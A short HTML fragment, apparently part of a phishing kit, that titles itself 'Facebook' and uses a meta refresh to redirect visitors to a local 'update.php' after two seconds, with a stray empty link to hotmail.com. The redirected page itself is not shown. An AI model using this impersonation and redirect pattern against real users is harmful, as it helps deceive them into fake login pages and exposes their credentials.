<p><a href="http://hotmail.com/"></a></p>

<html>
<head>
<title>Facebook</title>
<meta http-equiv="refresh" content="2; URL=update.php">
<meta name="keywords" content="automatic redirection">
</head>
<body>